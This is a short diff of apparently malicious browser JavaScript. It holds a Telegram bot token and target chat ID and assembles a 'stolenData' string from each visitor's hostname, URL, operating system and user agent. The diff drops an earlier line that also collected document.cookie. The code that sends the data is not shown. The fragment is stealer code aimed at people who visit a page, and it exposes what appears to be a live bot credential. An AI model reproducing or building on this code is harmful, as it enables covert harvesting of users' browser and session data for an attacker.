@@ -1,7 +1,6 @@
 var botToken = "5691570782:AAGMKFygk9MyAlZXtPNddydtDsY4Ouo8-ng";
 var targetChatId = "5010958919";
-var stolenData = "Cookies: " + document.cookie + "\n";
-stolenData += "Hostname: " + window.location.hostname + "\n";
+var stolenData = "Hostname: " + window.location.hostname + "\n";
 stolenData += "URL: " + window.location.href + "\n";
 stolenData += "Operating System: " + navigator.platform + "\n";
 stolenData += "Browser: " + navigator.userAgent + "\n";
